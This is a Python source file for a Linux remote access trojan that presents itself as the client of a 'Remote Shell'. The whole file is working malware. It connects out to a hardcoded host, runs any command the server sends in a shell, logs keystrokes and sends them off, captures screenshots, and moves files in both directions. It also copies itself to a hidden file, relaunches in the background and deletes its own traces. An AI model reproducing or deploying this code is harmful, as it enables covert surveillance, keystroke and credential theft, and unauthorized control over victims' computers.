#!/usr/bin/python

# Description - ( Linux systems ):

# This script serves as the client-side counterpart to the Remote Shell server.
# It connects to the server and allows the execution of commands.

try:
    # Standard library imports
    import io
    import socket
    import threading
    import time
    import subprocess
    import os
    import sys
    import platform
    import shutil

    # Import Special libraries
    import json
    from PIL import ImageGrab
    from pynput.keyboard import Key, Listener

except ModuleNotFoundError:
    from subprocess import call
    modules = ["Pillow", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)


class RemoteControl:
    def __init__(self):
        self.l_host = '192.168.0.0'
        self.l_port = 5555
        self.server_socket = None
        self.keylogger_active = False
        self.active_keylogger_listener = False
        self.connection_died = 0  # ............... if 1, __main__ loop sys.exit(0).
        self.timeout = 0  # ....................... Time-out logic handle, server disconnect mid-session.
        self.json_receive_timeout = 0  # .......... json Time-out logic handle, server disconnect mid-session.

    def receive_server_commands(self):
        """
        Retrieves commands from server
        """
        while True:
            try:
                command = self.receive_data_as_json()
                if command == 'quit':
                    self.connection_died = 1
                    break
                elif command == '':
                    # handle server disconnect mid-session
                    self.timeout += 1
                    time.sleep(0.25)
                    if self.timeout == 15:
                        self.connection_died = 1
                        break

                elif command == 'clear':
                    continue

                elif command[:3] == 'cd ':
                    os.chdir(command[3:])
                    continue

                elif command.startswith('keyscan start'):
                    self.keylogger_active = True
                    self.active_keylogger_listener = True
                    print("Keylogger started.")
                    continue

                elif command.startswith('keyscan stop'):
                    self.keylogger_active = False
                    print("Keylogger stopped.")
                    continue

                elif command.startswith('download'):
                    # upload to server
                    self.upload_file(command[9:])
                    continue

                elif command.startswith('upload'):
                    # download from server
                    self.download_file(command[7:])
                    continue

                elif command.startswith('screenshot'):
                    self.screen_shot()
                    continue

                elif command.startswith('sys info'):
                    self.sys_info()
                    continue

                else:
                    # Execute the command with shell and capture the output
                    execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE)
                    result = execute.stdout.read() + execute.stderr.read()
                    result = result.decode()
                    # Send shell result to server
                    time.sleep(1)
                    self.send_data_as_json(result)

            except Exception as e_main:
                print(f"\ndef[Main] Error:\n{e_main}")
                self.connection_died = 1
                break

    def capture_keys(self, key):
        """
        Captures and sends pressed keys to the server if key logging is active.
        :param key: The key pressed by the user.
        """
        if self.keylogger_active:
            try:
                # Check if the key represents the backspace key
                if key == Key.backspace:
                    char = "<- "
                elif key == Key.space:
                    char = " "
                elif key == Key.enter:
                    char = "\n"
                elif hasattr(key, 'char'):
                    char = key.char
                    # There's a bug when pressing numpy 5 on linux systems
                    # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
                    if key.vk == 65437:
                        char = "5"
                else:
                    char = str(key.char)
                self.server_socket.send(char.encode())
            except Exception as e_cap_key:
                print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
        else:
            listener.stop()

    def connect_to_server(self):
        """
        Establishes a connection to the remote server.
        """
        while True:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.connect((self.l_host, self.l_port))
                print("[+] Connected!")
                break
            except TimeoutError:
                print('[!] Connection timed out, retrying in 10 seconds...')
                time.sleep(10)
            except Exception as e_connect:
                print(f'[!] An error occurred: {e_connect}')
                time.sleep(10)

    def send_data_as_json(self, data):
        """
        Converts data to JSON and sends it over the server socket
        """
        json_data = json.dumps(data)
        self.server_socket.send(json_data.encode())

    def receive_data_as_json(self):
        """
        Receives data from the server and decodes it as JSON
        """
        received_data = ''
        while True:
            if self.json_receive_timeout == 25:
                break
            try:
                received_data += self.server_socket.recv(1024).decode().rstrip()
                return json.loads(received_data)
            except json.JSONDecodeError:
                self.json_receive_timeout += 1
                continue

    def upload_file(self, file_name):
        """
        Uploads a file to the server
        """
        try:
            with open(file_name, 'rb') as up_file:
                self.server_socket.send(up_file.read())
        except Exception as e_upload_file:
            print(f"Error uploading file: {e_upload_file}")
            pass

    def download_file(self, file_name):
        """
        Downloads a file from the server
        """
        try:
            with open(file_name, 'wb') as down_file:
                self.server_socket.settimeout(1)
                while True:
                    chunk = self.server_socket.recv(1024)
                    if not chunk:
                        break
                    down_file.write(chunk)
        except socket.timeout:
            pass  # Ignore timeouts
        except Exception as e_download_file:
            print(f"Error downloading file: {e_download_file}")
            pass
        finally:
            self.server_socket.settimeout(None)

    def screen_shot(self):
        """
        Captures a screenshot, converts it to bytes, and sends it in chunks
        """
        screenshot = ImageGrab.grab()
        image_stream = io.BytesIO()
        screenshot.save(image_stream, format='PNG')
        image_data = image_stream.getvalue()
        chunk_size = 1024
        total_sent = 0
        while total_sent < len(image_data):
            chunk = image_data[total_sent:total_sent + chunk_size]  # calculates the ending index for slicing
            self.server_socket.send(chunk)
            total_sent += len(chunk)

        # Send a marker to indicate the end of the image
        self.server_socket.send(b"END_OF_IMAGE")

    def sys_info(self):
        """
        Retrieves system information and sends it as JSON
        """
        system_info = f"""
        • Platform: {uname_info.sysname}
        • System: {uname_info.release}
        • Arch: {uname_info.machine}"""
        time.sleep(0.15)
        self.send_data_as_json(system_info)


if __name__ == "__main__":
    # Define the path to the lock file
    lock_file_path = "/tmp/.system_lock"

    # Get the current script's filename and directory
    current_script = os.path.abspath(__file__)
    script_directory = os.path.dirname(current_script)

    # Check if the lock file exists
    if not os.path.exists(lock_file_path):
        # Create the lock file to prevent further duplication
        with open(lock_file_path, "w") as lock_file:
            lock_file.write("lock")

        # Define the new filename and destination directory
        new_filename = ".system.py"
        destination_directory = script_directory  # Replace with your desired destination directory

        # Copy the script to the destination directory with the new filename
        new_script_path = os.path.join(destination_directory, new_filename)
        shutil.copyfile(current_script, new_script_path)

        # Make the new script executable
        os.chmod(new_script_path, 0o644)

        # Run the new script in the background with nohup
        subprocess.Popen(["nohup", "python", new_script_path, "&"])

        # Remove the current script
        os.remove(current_script)

        # Exit the current script
        sys.exit(0)

    # Check if the lock file exists
    if os.path.exists(lock_file_path):
        # Remove trace files
        os.remove(current_script)
        os.remove(os.path.join(script_directory, 'nohup.out'))

        # Remove the lock file, gg wp :)
        os.remove(lock_file_path)

    # Get system information
    uname_info = os.uname()

    server = RemoteControl()
    server.connect_to_server()

    server_commands_thread = threading.Thread(target=server.receive_server_commands)
    server_commands_thread.start()

    while True:
        '''
        main loop, all the other code is handled by "server_commands_thread"
        '''
        try:
            if server.connection_died == 1:
                print("\n[!] Connection died. Exiting in 3 seconds...")
                time.sleep(3)
                sys.exit(0)

            # Active listener logic
            if server.active_keylogger_listener:
                while server.keylogger_active:
                    listener = Listener(on_press=server.capture_keys)
                    listener.start()
                    server.active_keylogger_listener = False
                    break
            time.sleep(1)

        except KeyboardInterrupt:
            continue
        except Exception as e_main_loop:
            print(f"__main__ [Main loop]:\n{e_main_loop}")
            sys.exit(0)
